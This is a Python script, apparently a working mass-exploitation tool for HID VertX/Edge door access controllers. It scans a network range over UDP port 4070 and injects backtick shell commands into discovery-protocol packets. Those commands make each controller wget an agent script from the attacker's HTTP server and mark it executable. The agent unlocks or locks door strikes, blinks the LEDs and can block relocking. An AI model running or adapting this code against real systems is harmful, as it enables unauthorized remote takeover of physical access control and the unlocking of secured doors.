#!/usr/bin/env python
# By Mike Kelly
# exfil.co
# @lixmk
#
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

# Requires netaddr
# To install: pip install netaddr

import socket
import argparse
import SimpleHTTPServer
import SocketServer
import threading
import netaddr
from time import sleep
from os import remove

# Generating agent script. A readable version of this agent is at ./tools/agent
def genagent():
  with open("a","w+") as f:
    f.write('#!/bin/sh\nEXPECTED_ARGS=1;\nif [ $# -ne $EXPECTED_ARGS ]\nthen\n  exit 1\nfi\nif [ $1 = unlock ]\nthen\n  export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=1"\n  /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n  #Uncomment to reventing others from relocking via diagnostics_execute.cgi\n  #chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\nfi\nif [ $1 = lock ]\nthen\n  #If you uncommented the previous chmod, uncomment this one\n  #chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n  export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=0"\n  /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\nfi\nif [ $1 = blink ]\nthen\ni="0"\n  while [ $i -lt 10 ]\n  do\n    export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_GREEN&Relay=1&Action=1"\n    /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n    export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_GREEN&Relay=1&Action=0"\n    /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n    export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_BLUE&Relay=1&Action=1"\n    /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n    export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_BLUE&Relay=1&Action=0"\n    /mnt/apps/web/cgi-bin/diagnostics_execute.cgi\n    i=`expr $i + 1`\n  done\nfi\n')

if __name__ == '__main__':
  parser = argparse.ArgumentParser(usage='./massdeploy.py -r 10.0.0.1/24 -l 192.168.1.1')
  parser.add_argument('-r', '--cidr', required=True, help='Target CIDR Range')
  parser.add_argument('-p', '--lport', type=int, default="8080", help='Local port to host script (default: %(default)s)')
  parser.add_argument('-l', '--lhost', required=True, help='Local Host IP')
  args = parser.parse_args()
  cidr = args.cidr
  rport = 4070
  lport = args.lport
  lhost = args.lhost
  
  print "#####################################"
  print "# Conceirge HID Mass Agent Deployer #"
  print "#####################################"
  print ""
  # Generate Agent Script
  genagent()
  # reuse allows for fast runs of script
  SocketServer.TCPServer.allow_reuse_address = True
  # Convert Local IP address to hex to save space
  ipbits = lhost.split('.')
  abcd = (int(ipbits[0])*256**3) + (int(ipbits[1])*256**2) + (int(ipbits[2])*256) + int(ipbits[3])
  local = hex(abcd).rstrip('L')
  # Start httpd in separate thread
  httpd = SocketServer.TCPServer(("", lport), SimpleHTTPServer.SimpleHTTPRequestHandler)
  th = threading.Thread(target=httpd.serve_forever)
  th.daemon = True
  th.start()
  # Start primary process
  for ip in netaddr.IPNetwork(cidr).iter_hosts():
    try:
      # Sending Discovery Packet
      s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
      s.setblocking(0)
      pkt0 = "discover;013;"
      print "[*] Sending Discovery Packet to: "+str(ip)
      s.sendto(pkt0, (str(ip), rport))
      s.settimeout(0.5)
      rspn = s.recv(1024)
      # Checking response
      if rspn.split(";")[0] == "discovered":
        rmac = rspn.split(";")[2]
        # Print parsed response
        print ""
        print "[+] Response: "+rspn.split(";")[0]
        print "[+] Device Type: "+rspn.split(";")[6]
        print "[+] Hostname: "+rspn.split(";")[3]
        print "[+] Internal IP: "+rspn.split(";")[4]
        print "[+] MAC Address: "+rspn.split(";")[2]
        print "[+] Firmware Version: "+rspn.split(";")[7]
        print "[+] Build Date: "+rspn.split(";")[8]
        print ""
        pkt1 = "command_blink_on;044;"+rmac+";1`wget -O/tmp/a http://"+local+":"+str(lport)+"/a`;"
        pkt2 = "command_blink_on;044;"+rmac+";1`chmod +x /tmp/a`;"
        # Checking Device Type: V2000 requires extra delays
        if rspn.split(";")[6] == "V2000":
          pkt1 = "command_blink_on;044;"+rmac+";1`wget -O/tmp/a http://"+lhost+":"+str(lport)+"/a`;"
          if len(pkt1) <= 84:
            # Sending payloads to V2000
            print "[$] Deploying agent to: "+str(ip)
            s.sendto(pkt1, (str(ip), rport))
            sleep(3)
            s.sendto(pkt2, (str(ip), rport))
            sleep(0.5)
            s.close
            with open("agents.txt","a+") as f:
              f.write(str(ip)+"\n")
            print ""
          else:
            # V2000 Payload too large. Try setting lower port number.
            print "[!] Payload length over limit for VertX V2000"
            print "[!] Try setting a two digit port (ie: -p 81)"
            print "[!] This may require root/sudo"
            print ""
        else:
          # Sending payloads to non-V2000
          print "[$] Deploying agent to: "+str(ip)
          s.sendto(pkt1, (str(ip), rport))
          sleep(0.5)
          s.sendto(pkt2, (str(ip), rport))
          sleep(0.5)
          s.close
          with open("agents.txt","a+") as f:
            f.write(str(ip)+"\n")
          print ""
    # Keyboard interupt catching
    except (KeyboardInterrupt, SystemExit):
      s.close
      print "Keyboard Interrupt: Stopping all processes"
      raise
    except (socket.timeout, socket.error):
      s.close
      continue
  # Removing local copy of agent
  remove("a")
  print ""
  print "[*] Deployment complete. See 'agents.txt' for full list of agent IP's"
